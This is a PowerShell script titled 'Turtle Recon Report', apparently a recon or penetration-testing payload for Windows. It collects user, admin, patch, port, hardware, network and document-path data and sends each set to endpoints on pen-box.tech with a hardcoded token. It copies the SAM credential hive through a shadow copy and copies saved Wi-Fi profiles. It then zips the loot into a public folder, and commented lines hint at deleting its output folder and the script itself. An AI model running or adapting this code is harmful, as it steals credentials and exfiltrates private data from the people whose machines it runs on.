# first get ready to push to Json

$business_id = 1000;
$machine_id = 1000;

$folderDateTime = (get-date).ToString('d-M-y HHmmss')
$userDir = (Get-ChildItem env:\userprofile).value + '\Turtle Report ' + $folderDateTime
$fileSaveDir = New-Item  ($userDir) -ItemType Directory
$date = get-date


$style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html'
$Report = $Report + "<div id=body><h1>Turtle Recon Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>"

#user info
$url = 'https://pen-box.tech/user_information/create.php? Token=b8v1dE69amHhtf98xO6qFRluHYPvBXyNjqNZzGZfXfVYIGwhxNR9tbbgVUD3zmT6AGla4sKLrWeQjalKQ4ipt9tpAsnfoNDG6cCFlxiMeaeifzCZYlfgO5mAdjilNJSfzpJdUuQoNHoixO9gebC3TIOWQ5tRsY6gvSKsO1U9M9j1ExEUlbzNUvDEpmhGh3wC6SVS27rcC7E29nnVLOwUasgTXyRnhaP4h7QElYctMRBuSMqJ3RIKZKosypps4eUI';


$UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired
$UserType = $UserInfo.AccountType
$UserSid = $UserInfo.SID
$UserPass = $UserInfo.PasswordRequired
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')

If ($UserInfo.PasswordRequired -eq $false) {$UserPassReq = 0}
Else {$UserPassReq = 1}

If ($IsAdmin -eq $false) {$IsAdminB = 0}
Else {$IsAdminB = 1}

$UserPayload = @{
	business_id = $business_id;
	machine_id = $machine_id;
	name = $env:USERNAME;
	type = $UserType;
	sid = $UserSid;
	domain = $env:USERDOMAIN;
	password = $UserPassReq;
	admin = $IsAdminB;
};
	
$the_json = $UserPayload | ConvertTo-Json;
Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;

$Report =  $Report + "<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>"
$Report = $Report + '</div>'


$createShadow = (gwmi -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')
$shadow = gwmi Win32_ShadowCopy | ? { $_.ID -eq $createShadow.ShadowID }
$addSlash  = $shadow.DeviceObject + '\'
cmd /c mklink C:\shadowcopy $addSlash
Copy-Item 'C:\shadowcopy\Windows\System32\config\SAM' $fileSaveDir
Remove-Item -recurse -force 'C:\shadowcopy'


# installed programs 
$url = 'https://pen-box.tech/installed_programs/create.php? Token=b8v1dE69amHhtf98xO6qFRluHYPvBXyNjqNZzGZfXfVYIGwhxNR9tbbgVUD3zmT6AGla4sKLrWeQjalKQ4ipt9tpAsnfoNDG6cCFlxiMeaeifzCZYlfgO5mAdjilNJSfzpJdUuQoNHoixO9gebC3TIOWQ5tRsY6gvSKsO1U9M9j1ExEUlbzNUvDEpmhGh3wC6SVS27rcC7E29nnVLOwUasgTXyRnhaP4h7QElYctMRBuSMqJ3RIKZKosypps4eUI';
# has issues
$i = 0
$payloadInfo = Get-WmiObject -class Win32_Product | Select Name,Version,InstallDate
#$payloadVersion = Get-WmiObject -class Win32_Product | Select Version
#$payloadInstall = Get-WmiObject -class Win32_Product | Select InstallDate
do {
	$payloadPrograms = @{
		business_id = $business_id;
		machine_id = $machine_id;
		name = $payloadInfo[$i].Name;
		version = $payloadInfo[$i].Version;
		install_date = $payloadInfo[$i].InstallDate;
	};
	$the_json = $payloadPrograms | ConvertTo-Json;
	Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
	$i ++
	 
}while ($i -lt $payloadName.Count)

	
$Report =  $Report + '<div id=center><h3> Installed Programs</h3> '
$Report =  $Report + (Get-WmiObject -class Win32_Product | ConvertTo-html  Name, Version,InstallDate)
$Report = $Report + '</table></div>'
 $u = 0

#usb
$url = 'https://pen-box.tech/usb_devices/create.php? Token=b8v1dE69amHhtf98xO6qFRluHYPvBXyNjqNZzGZfXfVYIGwhxNR9tbbgVUD3zmT6AGla4sKLrWeQjalKQ4ipt9tpAsnfoNDG6cCFlxiMeaeifzCZYlfgO5mAdjilNJSfzpJdUuQoNHoixO9gebC3TIOWQ5tRsY6gvSKsO1U9M9j1ExEUlbzNUvDEpmhGh3wC6SVS27rcC7E29nnVLOwUasgTXyRnhaP4h7QElYctMRBuSMqJ3RIKZKosypps4eUI';

$allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace)
$Report =  $Report + '<div id=right><h3>USB Devices</h3><table>'

# more usb in loop

do {
$gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB)
$Report = $Report + "<tr><td>Drive Name: </td><td> " + $allUsb[$u].Name + $allUsb[$u].Label + "</td><td>Free Space: </td><td>" + $gbUSB + "GB</td></tr>"

$payloadUSB = @{
		business_id = $business_id;
		machine_id = $machine_id;
		drive_name = $allUsb[$u].Name + $allUsb[$u].Label;
		free_space = $gbUSB;
	};
	$the_json = $payloadUSB | ConvertTo-Json;
	Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;

Write-Output $fullUSB
$u ++
} while ($u -lt $allUsb.Count)

#updates

$url = 'https://pen-box.tech/installed_updates/create.php? Token=b8v1dE69amHhtf98xO6qFRluHYPvBXyNjqNZzGZfXfVYIGwhxNR9tbbgVUD3zmT6AGla4sKLrWeQjalKQ4ipt9tpAsnfoNDG6cCFlxiMeaeifzCZYlfgO5mAdjilNJSfzpJdUuQoNHoixO9gebC3TIOWQ5tRsY6gvSKsO1U9M9j1ExEUlbzNUvDEpmhGh3wC6SVS27rcC7E29nnVLOwUasgTXyRnhaP4h7QElYctMRBuSMqJ3RIKZKosypps4eUI';


$payloadInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | sort-object -property installedon -Descending | Select  Description, HotFixId,Installedon,InstalledBy

$i = 0

do {
	$payloadUpdates = @{
		business_id = $business_id;
		machine_id = $machine_id;
		description = $payloadInfo[$i].Description;
		hf_id = $payloadinfo[$i].HotFixId;
		installed_on = [string]$payloadInfo[$i].Installedon;
		installed_by = $payloadInfo[$i].InstalledBy;
	};
	#$payloadInfo[$i].InstalledBy;
	$the_json = $payloadUpdates | ConvertTo-Json;
	Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
	$i ++
	 
}while ($i -lt $payloadInfo.Count)

$Report = $Report + '</table></div>'
$Report =  $Report + '<div id=center><h3> Installed Updates</h3>'
$Report =  $Report +  (Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | sort-object -property installedon -Descending | ConvertTo-Html   Description, HotFixId,Installedon,InstalledBy)
$Report = $Report + '</div>'

# Port Review
$url = 'https://pen-box.tech/port_scan/create.php? Token=b8v1dE69amHhtf98xO6qFRluHYPvBXyNjqNZzGZfXfVYIGwhxNR9tbbgVUD3zmT6AGla4sKLrWeQjalKQ4ipt9tpAsnfoNDG6cCFlxiMeaeifzCZYlfgO5mAdjilNJSfzpJdUuQoNHoixO9gebC3TIOWQ5tRsY6gvSKsO1U9M9j1ExEUlbzNUvDEpmhGh3wC6SVS27rcC7E29nnVLOwUasgTXyRnhaP4h7QElYctMRBuSMqJ3RIKZKosypps4eUI';


$Computer = $env:COMPUTERNAME
$PortList = 0, 21, 22, 23, 25, 79, 80, 110, 113, 119, 135, 137, 139, 143, 389, 443, 445, 1002, 1024, 1030, 1720, 1900, 5000, 8080
$Report = $Report  + '<div id=right><h3>Port Scan of ' + $Computer + '</h3><table>'
foreach ($PortNumber in $PortList) {
$PortCheck = New-Object Net.Sockets.TcpClient
$PortCheck.Connect($Computer, $PortNumber)


	

if ($PortCheck.Connected) {
$Report = $Report  +  '<tr><td><b><font color=red>Port ' + $PortNumber + ' is open</font></b></td></tr>'
$payloadPorts = @{
	business_id = $business_id;
	machine_id = $machine_id;
	port_num = $PortNumber;
	port_stat = 1;
	};
	$the_json = $payloadPorts | ConvertTo-Json;
	Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
	}
else {$Report = $Report  +  '<tr><td>Port ' + $PortNumber + ' is closed</td></tr>'
$payloadPorts = @{
	business_id = $business_id;
	machine_id = $machine_id;
	port_num = $PortNumber;
	port_stat = 0;
	};
	$the_json = $payloadPorts | ConvertTo-Json;
	Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
	}}
$Report = $Report + '</table></div>'
$Report =  $Report + '<div id=left><h3>Shared Drives/Devices</h3>'
$Report =  $Report + (GET-WMIOBJECT Win32_Share | convertto-html Name, Description, Path)
$Report = $Report + '</div>'


# Comp Information START

$SysBootTime = Get-WmiObject Win32_OperatingSystem
$BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime
$LastBoot = [System.Management.ManagementDateTimeconverter]::ToDateTime("$((gwmi  Win32_OperatingSystem).LastBootUpTime)")
$Uptime = (Get-Date) - $LastBoot
$SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)
$SerialNo = $SysSerialNo.SerialNumber
$SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model
$SysManufacturer = $SysInfo.Manufacturer
$SysModel = $SysInfo.Model

#OS

$OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption

# Disk Space

$disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
$HD = [math]::truncate($disk.Size / 1GB)
$FreeSpace = [math]::truncate($disk.FreeSpace / 1GB)
$SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize
$Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB)

#get Cpu type

$SysCpu = Get-WmiObject Win32_Processor | Select Name
$Cpu = $SysCpu.Name

# More comp info

$HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber
$HardSerialNo = $HardSerial.SerialNumber
$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name
$graphicsCard = gwmi win32_VideoController |select Name
$graphics = $graphicsCard.Name
$SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1
$DriveLetter = $SysCdDrive.Drive
$DriveName = $SysCdDrive.Caption
$Disk = $DriveLetter + '\' + $DriveName

#Firewall Info

$Firewall = New-Object -com HNetCfg.FwMgr
$FireProfile = $Firewall.LocalPolicy.CurrentProfile
$FireProfile = $FireProfile.FirewallEnabled
$Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"
$wlanSaveDir = New-Item $userDir'\Turtle\WLAN_PROFILES' -ItemType Directory
$srcDir = 'C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces'
Copy-Item $srcDir $wlanSaveDir -Recurse

$url = 'https://pen-box.tech/computer_information/create.php? Token=b8v1dE69amHhtf98xO6qFRluHYPvBXyNjqNZzGZfXfVYIGwhxNR9tbbgVUD3zmT6AGla4sKLrWeQjalKQ4ipt9tpAsnfoNDG6cCFlxiMeaeifzCZYlfgO5mAdjilNJSfzpJdUuQoNHoixO9gebC3TIOWQ5tRsY6gvSKsO1U9M9j1ExEUlbzNUvDEpmhGh3wC6SVS27rcC7E29nnVLOwUasgTXyRnhaP4h7QElYctMRBuSMqJ3RIKZKosypps4eUI';
$payloadCompInfo = @{
	business_id = $business_id;
	machine_id = $machine_id;
	os = $OS;
	os_sn = $HardSerialNo;
	user = $env:USERNAME;
	uptime = $Uptime.totalminutes;
	manufacturer = $SysManufacturer;
	model = $SysModel;
	serial_number = $SerialNo;
	firewall = $FireProfile;
	drive_size = $disk.size;
	drive_free_space = $FreeSpace;
	ram = $Ram;
	processor = $Cpu;
	cd_drive = $DriveLetter + $DriveName;
	graphics = $graphics;
	};
	$the_json = $payloadCompInfo | ConvertTo-Json;
	Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
	
	
# getting file names
# Getting stuck here we need to get types out as well as names, full path and, accessTimes
# should we loop for every file on the size of get-childitem?
# Have a conflict with the type keyword

$ChildItems = Get-ChildItem -Path 'C:\Users' -Include *.docx, *.pdf, *.zip, *.xlsx -Recurse
	ForEach ($Child in $ChildItems) {
	$url = 'https://pen-box.tech/user_documents/create.php? Token=b8v1dE69amHhtf98xO6qFRluHYPvBXyNjqNZzGZfXfVYIGwhxNR9tbbgVUD3zmT6AGla4sKLrWeQjalKQ4ipt9tpAsnfoNDG6cCFlxiMeaeifzCZYlfgO5mAdjilNJSfzpJdUuQoNHoixO9gebC3TIOWQ5tRsY6gvSKsO1U9M9j1ExEUlbzNUvDEpmhGh3wC6SVS27rcC7E29nnVLOwUasgTXyRnhaP4h7QElYctMRBuSMqJ3RIKZKosypps4eUI';
	$payloadFileNames = @{
	business_id = $business_id;
	machine_id = $machine_id;
	name = $Child.Name;
	type = $Child.Extension;
	path = $Child.FullName;
	last_access = $Child.LastAccessTime;
	};
	$the_json = $payloadFileNames | ConvertTo-Json;
	Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
}	
	
$Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>'
$Report =  $Report + (Get-ChildItem -Path 'C:\Users' -Include *.docx, *.pdf, *.zip, *.xlsx -Recurse |convertto-html File, Name, LastAccessTime)
$Report = $Report + '</div>'

# Network Information
$NetworkAdapter = Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True'
$url = 'https://pen-box.tech/network_information/create.php? Token=b8v1dE69amHhtf98xO6qFRluHYPvBXyNjqNZzGZfXfVYIGwhxNR9tbbgVUD3zmT6AGla4sKLrWeQjalKQ4ipt9tpAsnfoNDG6cCFlxiMeaeifzCZYlfgO5mAdjilNJSfzpJdUuQoNHoixO9gebC3TIOWQ5tRsY6gvSKsO1U9M9j1ExEUlbzNUvDEpmhGh3wC6SVS27rcC7E29nnVLOwUasgTXyRnhaP4h7QElYctMRBuSMqJ3RIKZKosypps4eUI';
$payloadNetworkInfo = @{
business_id = $business_id;
machine_id = $machine_id;
description = $NetworkAdapter.Description;
dns = $NetworkAdapter.DNSHostName;
ip = $NetworkAdapter.IPAddress;
mac = $NetworkAdapter.MACAddress;
}
$the_json = $payloadNetworkInfo | ConvertTo-Json;
Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;



$Report =  $Report + '<div id=center><h3>Network Information</h3>'
$Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html)
$Report = $Report + '</table></div>'
$Report >> $fileSaveDir'/ComputerInfo.html'

#getting all the files setup

function copy-ToZip($fileSaveDir){
$srcdir = $fileSaveDir
$zipFile = 'C:\Users\Public\Report.zip'
if(-not (test-path($zipFile))) {
set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
(dir $zipFile).IsReadOnly = $false}
$shellApplication = new-object -com shell.application
$zipPackage = $shellApplication.NameSpace($zipFile)
$files = Get-ChildItem -Path $srcdir
foreach($file in $files) {
$zipPackage.CopyHere($file.FullName)
while($zipPackage.Items().Item($file.name) -eq $null){
Start-sleep -seconds 1 }}}
copy-ToZip($fileSaveDir)


#remove-item $fileSaveDir -recurse
#Remove-Item $MyINvocation.InvocationName